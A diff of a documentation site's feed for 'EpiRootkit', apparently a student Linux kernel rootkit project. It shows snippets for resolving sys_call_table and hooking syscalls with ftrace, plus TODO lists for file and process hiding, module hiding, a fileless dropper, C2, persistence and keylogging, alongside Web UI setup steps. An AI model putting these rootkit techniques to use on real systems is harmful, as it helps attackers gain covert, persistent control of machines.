- &lt;div class="prism-codeblock ">
- &lt;pre id="3079c8b" class="language- ">
- &lt;code>epirootkit&lt;/code>
- &lt;/pre>
- &lt;/div>
+&lt;li>&lt;input disabled="" type="checkbox"> Integrate file transfer with C2 server and client
+&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Add CLI/Web UI commands for upload/download&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Display transfer status and errors in UI&lt;/li>
+&lt;/ul>
 &lt;/li>
-&lt;/ol>
-&lt;hr>
-&lt;h1 id="3-password-protection">3. Password Protection &lt;a href="#3-password-protection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-Protect &lt;code>daniel.*&lt;/code> commands with a salted hash.&lt;/p></description></item><item><title>Symbol Resolution &amp; Ftrace Hooks</title><link>/docs/04-epirootkit/features/symbol-ftrace/</link><pubDate>Sun, 11 May 2025 18:20:00 +0100</pubDate><guid>/docs/04-epirootkit/features/symbol-ftrace/</guid><description>&lt;h1 id="symbol-resolution">Symbol Resolution &lt;a href="#symbol-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;ol>
-&lt;li>We spoof a GPL license so the kernel exports &lt;code>kallsyms_lookup_name()&lt;/code>:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="301615e" class="language-c ">
- &lt;code>MODULE_LICENSE(&amp;#34;GPL&amp;#34;);&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>At init, we call:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="20e28ad" class="language-c ">
- &lt;code>sys_call_table = (void **)kallsyms_lookup_name(&amp;#34;sys_call_table&amp;#34;);&lt;/code>
- &lt;/pre>
- &lt;/div>
-This gives us the address of the syscall table.&lt;/li>
-&lt;/ol>
-&lt;hr>
-&lt;h1 id="ftrace-based-hooking">Ftrace-Based Hooking &lt;a href="#ftrace-based-hooking" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>
-&lt;div class="alert alert-info d-flex" role="alert">
- &lt;div class="flex-shrink-1 alert-icon">
- 
- &lt;span class="material-icons size-20 me-2">
- info
- &lt;/span>&lt;/div>
- 
- &lt;div class="w-100">We use ftrace to hook without writing to kernel memory directly.&lt;/div>
- &lt;/div>
-&lt;p>For each target syscall:&lt;/p>
-&lt;ol>
-&lt;li>Define an &lt;code>ftrace_ops&lt;/code> with flags:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="f3796aa" class="language-c ">
- &lt;code>.func = hook_trampoline,
-.flags = FTRACE_OPS_FL_SAVE_REGS |
- FTRACE_OPS_FL_IPMODIFY&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>Apply the filter:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="c83d517" class="language-c ">
- &lt;code>ftrace_set_filter_ip(&amp;amp;ops, (unsigned long)orig_syscall, 0, 0);
-register_ftrace_function(&amp;amp;ops);&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>Our trampoline copies registers, calls &lt;code>hook_fn()&lt;/code>, then jumps back to the original.&lt;/li>
-&lt;/ol>
-&lt;p>Always unregister your ftrace functions in &lt;code>cleanup_module()&lt;/code>:&lt;/p></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;p>Description of any extra implemented features (upgrade, packet hiding, keylogging, etc.).&lt;/p></description></item><item><title>Overview</title><link>/docs/06-web-ui/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/main-dashboard.png"
+&lt;li>&lt;input disabled="" type="checkbox"> Test file transfer end-to-end (various file sizes, error cases)&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Fileless Dropper &amp; Rootkit Loader</title><link>/docs/04-epirootkit/features/fileless-dropper-loader/</link><pubDate>Sun, 11 May 2025 18:15:00 +0100</pubDate><guid>/docs/04-epirootkit/features/fileless-dropper-loader/</guid><description>&lt;h2 id="todo-implement-fileless-dropper--loader">TODO: Implement Fileless Dropper &amp;amp; Loader &lt;a href="#todo-implement-fileless-dropper--loader" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement in-memory ELF staging using &lt;code>memfd_create&lt;/code>&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Develop loader to extract and decompress kernel image&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement symbol resolution and LKM insertion&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add secure cleanup of temporary files and processes&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Integrate dropper/loader with C2 workflow&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Test on supported kernels and document limitations&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Stealth Hooks &amp; daniel.* Commands</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 11 May 2025 18:25:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h2 id="todo-implement-stealth--hiding-features">TODO: Implement Stealth &amp;amp; Hiding Features &lt;a href="#todo-implement-stealth--hiding-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code> to hide files and directories&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Hide kernel module from &lt;code>/proc/modules&lt;/code> and &lt;code>lsmod&lt;/code>&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement PID hiding via dynamic list&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement stealth command channel via &lt;code>rmdir()&lt;/code>&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add privilege escalation and config dump commands&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Test all hiding features and document limitations&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p>
+&lt;h1 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
+We hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code>.&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;h2 id="todo-implement-password-protection-features">TODO: Implement Password Protection Features &lt;a href="#todo-implement-password-protection-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Add password-based authentication for rootkit commands&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Store password hashes securely&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement password change and reset mechanisms&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document password protection and security best practices&lt;/li>
+&lt;/ul></description></item><item><title>Encrypted C2, Persistence &amp; Auth</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 11 May 2025 18:30:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h2 id="todo-implement-persistence--auth-features">TODO: Implement Persistence &amp;amp; Auth Features &lt;a href="#todo-implement-persistence--auth-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement encrypted C2 heartbeat and reconnection logic&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add autoload on boot (persistence) via module config&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement password protection for sensitive commands&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Store and verify password hashes securely&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Test persistence and authentication on supported systems&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Symbol Resolution &amp; Ftrace Hooks</title><link>/docs/04-epirootkit/features/symbol-ftrace/</link><pubDate>Sun, 11 May 2025 18:20:00 +0100</pubDate><guid>/docs/04-epirootkit/features/symbol-ftrace/</guid><description>&lt;h2 id="todo-implement-symbol-resolution--ftrace-hooks">TODO: Implement Symbol Resolution &amp;amp; Ftrace Hooks &lt;a href="#todo-implement-symbol-resolution--ftrace-hooks" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement dynamic symbol resolution (e.g., &lt;code>kallsyms_lookup_name&lt;/code>)&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add ftrace-based syscall hooking&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Ensure safe registration/unregistration of hooks&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document implementation and kernel compatibility&lt;/li>
+&lt;/ul></description></item><item><title>Bonus Features</title><link>/docs/04-epirootkit/features/bonus-features/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/bonus-features/</guid><description>&lt;h2 id="todo-implement-bonus-features">TODO: Implement Bonus Features &lt;a href="#todo-implement-bonus-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Add rootkit upgrade mechanism&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement packet hiding and keylogging&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add network traffic redirection&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement NGL clone with the backdoor&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document and test all bonus features&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Overview</title><link>/docs/06-web-ui/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/main-dashboard.png"
  alt="Web UI">
 &lt;/figure>
 
@@ -877,12 +614,10 @@ register_ftrace_function(&amp;amp;ops);&lt;/code>
 &lt;li>Global keyboard shortcuts for all major actions&lt;/li>
 &lt;li>Drag-and-drop panel reordering&lt;/li>
 &lt;/ul>
-&lt;p>This section covers the rationale, features, and usage of the Web UI. See the following pages for details on setup, features, and development notes.&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/06-web-ui/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/installation/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>Node.js (LTS recommended)&lt;/li>
-&lt;li>npm&lt;/li>
-&lt;/ul>
-&lt;h2 id="setup-steps">Setup Steps &lt;a href="#setup-steps" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>Navigate to the &lt;code>webui/&lt;/code> directory:
+&lt;p>This section covers the rationale, features, and usage of the Web UI. See the following pages for details on setup, features, and development notes.&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/06-web-ui/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/installation/</guid><description>&lt;h1 id="web-ui-installation--setup">Web UI Installation &amp;amp; Setup &lt;a href="#web-ui-installation--setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu system. Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/environment/'>&lt;p>SETUP&lt;/p>&lt;strong>Initial Setup &amp; Installation&lt;/strong>&lt;br>Prepare your host system from scratch for the EpiRootkit project.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/environment/">Host Environment Setup&lt;/a> first.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="1-install-nodejs-npm-and-pnpm">1. Install Node.js, npm, and pnpm &lt;a href="#1-install-nodejs-npm-and-pnpm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If not already installed, run:&lt;/p>
 
 
 
@@ -898,34 +633,44 @@ register_ftrace_function(&amp;amp;ops);&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="0f2bd22" class="language-bash ">
+ &lt;pre id="3f389ed" class="language-bash ">
+ &lt;code>sudo apt update
+sudo apt install -y nodejs npm
+sudo npm install -g pnpm&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;blockquote>
+
+&lt;div class="alert alert-info d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ &lt;span class="material-icons size-20 me-2">
+ info
+ &lt;/span>&lt;/div>
+ 
+ &lt;div class="w-100">Check your versions: Node.js v18+ and pnpm v8+ are recommended. Use &lt;code>node -v&lt;/code> and &lt;code>pnpm -v&lt;/code> to verify.&lt;/div>
+ &lt;/div>
+&lt;/blockquote>
+&lt;h2 id="2-navigate-to-the-web-ui-directory">2. Navigate to the Web UI Directory &lt;a href="#2-navigate-to-the-web-ui-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="db8fc69" class="language-bash ">
  &lt;code>cd webui&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;/li>
-&lt;li>Install dependencies:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="07c96a9" class="language-bash ">
- &lt;code>pnpm install&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>Start the development server:
-
+&lt;h2 id="3-install-dependencies">3. Install Dependencies &lt;a href="#3-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -940,15 +685,34 @@ register_ftrace_function(&amp;amp;ops);&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="eea9952" class="language-bash ">
- &lt;code>pnpm run dev&lt;/code>
+ &lt;pre id="b879665" class="language-bash ">
+ &lt;code>pnpm install
+# Or, if you prefer npm:
+npm install&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;/li>
-&lt;li>Open your browser and go to &lt;a href="http://localhost:5173" rel="external" target="_blank">http://localhost:5173&lt;svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">&lt;path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/>&lt;/svg>&lt;/a> (or the port shown in your terminal).&lt;/li>
-&lt;/ol>
-&lt;blockquote>
-&lt;p>&lt;strong>Note:&lt;/strong> The Web UI is currently frontend-only. Backend integration is planned for future releases.&lt;/p></description></item><item><title>i3 like interface</title><link>/docs/06-web-ui/i3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/i3/</guid><description>&lt;h2 id="i3-like-interface">i3 like interface &lt;a href="#i3-like-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Yes, you read that right. I really tried to make this part of the Web UI feel like i3-wm.&lt;/p>
+&lt;h2 id="4-start-the-development-server">4. Start the Development Server &lt;a href="#4-start-the-development-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="b881346" class="language-bash ">
+ &lt;code>pnpm run dev
+# Or
+npm run dev&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Open your browser and go to &lt;a href="http://localhost:5173" rel="external" target="_blank">http://localhost:5173&lt;svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">&lt;path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/>&lt;/svg>&lt;/a> (or the port shown in your terminal).&lt;/p></description></item><item><title>i3 like interface</title><link>/docs/06-web-ui/i3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/06-web-ui/i3/</guid><description>&lt;h2 id="i3-like-interface">i3 like interface &lt;a href="#i3-like-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Yes, you read that right. I really tried to make this part of the Web UI feel like i3-wm.&lt;/p>
 &lt;figure class="img-fluid">&lt;img src="/images/webui/i3.png"
  alt="i3 like interface">
 &lt;/figure>
